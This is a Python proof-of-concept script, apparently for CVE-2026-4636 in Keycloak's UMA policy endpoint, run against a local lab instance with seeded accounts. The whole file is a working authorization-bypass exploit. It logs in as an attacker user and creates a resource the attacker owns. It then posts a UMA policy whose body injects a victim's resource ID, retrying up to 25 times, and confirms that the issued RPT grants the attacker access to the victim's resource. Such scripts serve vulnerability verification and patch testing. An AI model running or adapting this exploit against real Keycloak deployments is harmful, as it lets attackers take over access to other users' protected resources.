#!/usr/bin/env python3
import base64
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


EVIDENCE_DIR = os.environ.get("EVIDENCE_DIR", "/home/playground/output/attempt_1/evidence")
SEED_FILE = os.environ.get("SEED_FILE", "/opt/keycloak-data/seed-info.json")

BASE_URL = os.environ.get("BASE_URL", "http://127.0.0.1:8080")
REALM = os.environ.get("REALM", "anypoc")
CLIENT_ID = os.environ.get("CLIENT_ID", "resource-server-test")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "secret")
ATTACKER_USER = os.environ.get("ATTACKER_USER", "marta")
ATTACKER_PASS = os.environ.get("ATTACKER_PASS", "password")
VICTIM_USER = os.environ.get("VICTIM_USER", "kolo")
SCOPE = os.environ.get("POC_SCOPE", "Scope A")

EVIDENCE_FILES = [
    "attacker_policy_attempts.json",
    "failure.txt",
    "policy_creation_request.http",
    "policy_creation_request.json",
    "policy_creation_response.http",
    "policy_creation_response.json",
    "post_exploit_authorization_response.json",
    "post_exploit_rpt_payload.json",
    "pre_exploit_authorization_response.json",
    "resource_setup.json",
    "seed_info_used.json",
    "summary.json",
    "token_marta_response.json",
    "token_service_account_response.json",
    "victim_resource_setup.json",
]


def evidence(name, content):
    os.makedirs(EVIDENCE_DIR, exist_ok=True)
    with open(os.path.join(EVIDENCE_DIR, name), "w", encoding="utf-8") as f:
        f.write(content)


def evidence_json(name, obj):
    evidence(name, json.dumps(obj, indent=2, sort_keys=True) + "\n")


def reset_evidence():
    os.makedirs(EVIDENCE_DIR, exist_ok=True)
    for name in EVIDENCE_FILES:
        path = os.path.join(EVIDENCE_DIR, name)
        try:
            os.remove(path)
        except FileNotFoundError:
            pass


def load_seed():
    global BASE_URL, REALM, CLIENT_ID, CLIENT_SECRET, ATTACKER_USER, ATTACKER_PASS, VICTIM_USER
    try:
        with open(SEED_FILE, "r", encoding="utf-8") as f:
            seed = json.load(f)
    except FileNotFoundError:
        seed = {}

    BASE_URL = seed.get("base_url", BASE_URL)
    REALM = seed.get("realm", REALM)
    CLIENT_ID = seed.get("client", {}).get("client_id", CLIENT_ID)
    CLIENT_SECRET = seed.get("client", {}).get("client_secret", CLIENT_SECRET)
    ATTACKER_USER = seed.get("attacker", {}).get("username", ATTACKER_USER)
    ATTACKER_PASS = seed.get("attacker", {}).get("password", ATTACKER_PASS)
    VICTIM_USER = seed.get("victim", {}).get("username", VICTIM_USER)
    evidence_json("seed_info_used.json", seed)


def parse_json(text):
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        return {"raw": text}


def http_json(method, url, obj=None, headers=None):
    data = None
    hdrs = dict(headers or {})
    if obj is not None:
        data = json.dumps(obj).encode("utf-8")
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8")
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers), exc.read().decode("utf-8")


def http_form(url, fields, headers=None):
    data = urllib.parse.urlencode(fields).encode("utf-8")
    hdrs = {"Content-Type": "application/x-www-form-urlencoded", **(headers or {})}
    req = urllib.request.Request(url, data=data, headers=hdrs, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8")
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers), exc.read().decode("utf-8")


def wait_ready():
    ready_url = BASE_URL.replace(":8080", ":9000") + "/health/ready"
    for _ in range(60):
        try:
            status, _, _ = http_json("GET", ready_url)
            if status == 200:
                return
        except Exception:
            pass
        time.sleep(1)
    raise RuntimeError(f"Keycloak is not ready at {ready_url}")


def token_endpoint():
    return f"{BASE_URL}/realms/{REALM}/protocol/openid-connect/token"


def protection_base():
    return f"{BASE_URL}/realms/{REALM}/authz/protection"


def password_token(username, password):
    fields = {
        "grant_type": "password",
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "username": username,
        "password": password,
    }
    status, _, text = http_form(token_endpoint(), fields)
    body = parse_json(text)
    evidence_json(f"token_{username}_response.json", body)
    if status != 200:
        raise RuntimeError(f"token request for {username} failed with HTTP {status}: {text}")
    return body["access_token"]


def service_token():
    fields = {
        "grant_type": "client_credentials",
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
    }
    status, _, text = http_form(token_endpoint(), fields)
    body = parse_json(text)
    evidence_json("token_service_account_response.json", body)
    if status != 200:
        raise RuntimeError(f"service token setup request failed with HTTP {status}: {text}")
    return body["access_token"]


def create_resource(access_token, name, owner=None):
    payload = {
        "name": name,
        "ownerManagedAccess": True,
        "scopes": [{"name": "Scope A"}, {"name": "Scope B"}, {"name": "Scope C"}],
        "attributes": {"anypoc": ["cve-2026-4636-poc"]},
    }
    if owner:
        payload["owner"] = owner

    status, _, text = http_json(
        "POST",
        f"{protection_base()}/resource_set",
        payload,
        {"Authorization": f"Bearer {access_token}"},
    )
    body = parse_json(text)
    if status != 201:
        raise RuntimeError(f"resource creation failed with HTTP {status}: {text}")
    return body["_id"], payload, body


def authorize(attacker_token, victim_resource_id, label):
    fields = {
        "grant_type": "urn:ietf:params:oauth:grant-type:uma-ticket",
        "audience": CLIENT_ID,
        "permission": f"{victim_resource_id}#{SCOPE}",
    }
    status, _, text = http_form(
        token_endpoint(),
        fields,
        {"Authorization": f"Bearer {attacker_token}"},
    )
    body = parse_json(text)
    evidence_json(f"{label}_authorization_response.json", body)
    return status, body


def decode_jwt_payload(jwt):
    payload = jwt.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload.encode("ascii")).decode("utf-8"))


def create_cross_resource_policy(attacker_token, attacker_resource_id, victim_resource_id):
    endpoint = f"{protection_base()}/uma-policy/{attacker_resource_id}"
    payload = {
        "name": f"cve-2026-4636-cross-resource-{int(time.time())}",
        "description": "URL resource is attacker-owned, body injects victim resource",
        "resources": [attacker_resource_id, victim_resource_id],
        "users": [ATTACKER_USER],
        "scopes": [SCOPE],
    }

    evidence(
        "policy_creation_request.http",
        f"POST {endpoint} HTTP/1.1\n"
        "Authorization: Bearer <marta access token>\n"
        "Content-Type: application/json\n\n"
        f"{json.dumps(payload, indent=2, sort_keys=True)}\n",
    )
    evidence_json("policy_creation_request.json", payload)

    status, headers, text = http_json(
        "POST",
        endpoint,
        payload,
        {"Authorization": f"Bearer {attacker_token}"},
    )
    evidence(
        "policy_creation_response.http",
        f"HTTP {status}\n"
        + "".join(f"{k}: {v}\n" for k, v in headers.items())
        + "\n"
        + text
        + "\n",
    )
    body = parse_json(text)
    evidence_json("policy_creation_response.json", body)
    return status, body


def main():
    reset_evidence()
    load_seed()
    wait_ready()

    marta_token = password_token(ATTACKER_USER, ATTACKER_PASS)
    setup_token = service_token()
    stamp = int(time.time() * 1000)

    victim_resource_id, victim_req, victim_res = create_resource(
        setup_token,
        f"PoC Kolo Victim Resource {stamp}",
        owner=VICTIM_USER,
    )
    evidence_json("victim_resource_setup.json", {
        "victim_resource_id": victim_resource_id,
        "victim_create_request": victim_req,
        "victim_create_response": victim_res,
        "note": "The service-account token is used only to create a clean victim-owned resource for repeatable lab setup. Exploit and authorization requests use marta's token.",
    })

    pre_status, _ = authorize(marta_token, victim_resource_id, "pre_exploit")
    if pre_status == 200:
        raise RuntimeError("pre-exploit authorization unexpectedly succeeded")

    attempts = []
    attacker_resource_id = None
    policy_status = None
    policy_body = None
    for attempt in range(1, 26):
        candidate_id, attacker_req, attacker_res = create_resource(
            marta_token,
            f"PoC Marta Path Resource {stamp}-{attempt}",
        )
        status, body = create_cross_resource_policy(marta_token, candidate_id, victim_resource_id)
        attempts.append({
            "attempt": attempt,
            "attacker_resource_id": candidate_id,
            "attacker_create_request": attacker_req,
            "attacker_create_response": attacker_res,
            "policy_creation_status": status,
            "policy_creation_response": body,
        })
        policy_status, policy_body = status, body
        if status in (200, 201):
            attacker_resource_id = candidate_id
            break
    evidence_json("attacker_policy_attempts.json", attempts)
    if attacker_resource_id is None:
        raise RuntimeError(f"cross-resource UMA policy was not accepted after retries; last HTTP {policy_status}: {policy_body}")

    post_status, post_body = authorize(marta_token, victim_resource_id, "post_exploit")
    if post_status != 200 or "access_token" not in post_body:
        raise RuntimeError(f"post-exploit authorization failed with HTTP {post_status}: {post_body}")

    rpt_payload = decode_jwt_payload(post_body["access_token"])
    evidence_json("post_exploit_rpt_payload.json", rpt_payload)
    permissions = rpt_payload.get("authorization", {}).get("permissions", [])
    matches = [
        permission
        for permission in permissions
        if permission.get("rsid") == victim_resource_id and SCOPE in permission.get("scopes", [])
    ]
    if not matches:
        raise RuntimeError("post-exploit RPT did not contain the victim resource permission")

    summary = {
        "result": "VULNERABLE",
        "pre_exploit_status": pre_status,
        "policy_creation_status": policy_status,
        "post_exploit_status": post_status,
        "attacker_user": ATTACKER_USER,
        "attacker_resource_id": attacker_resource_id,
        "victim_user": VICTIM_USER,
        "victim_resource_id": victim_resource_id,
        "granted_permission": matches[0],
        "evidence_dir": EVIDENCE_DIR,
    }
    evidence_json("summary.json", summary)
    print(json.dumps(summary, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as exc:
        evidence("failure.txt", f"{type(exc).__name__}: {exc}\n")
        print(f"PoC failed: {exc}", file=sys.stderr)
        sys.exit(1)
